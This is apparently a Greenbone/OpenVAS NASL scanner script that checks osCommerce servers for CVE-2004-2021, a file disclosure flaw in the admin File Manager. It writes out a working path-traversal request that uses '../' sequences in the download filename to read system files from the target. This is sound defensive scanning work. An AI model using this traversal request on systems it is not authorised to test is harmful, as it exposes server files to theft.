CPE = "cpe:/a:oscommerce:oscommerce";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.12242" );
	script_version( "2021-07-20T10:07:38+0000" );
	script_tag( name: "last_modification", value: "2021-07-20 10:07:38 +0000 (Tue, 20 Jul 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2004-2021" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "osCommerce File Disclosure Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 Noam Rathaus" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_oscommerce_http_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "oscommerce/http/detected" );
	script_require_ports( "Services/www", 443 );
	script_tag( name: "summary", value: "There is a vulnerability in the osCommerce's File Manager
  that allows an attacker to retrieve arbitrary files from the webserver that reside outside the
  bounding HTML root directory." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = "/admin/file_manager.php?action=download&filename=../../../../../../../../" + files[file];
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

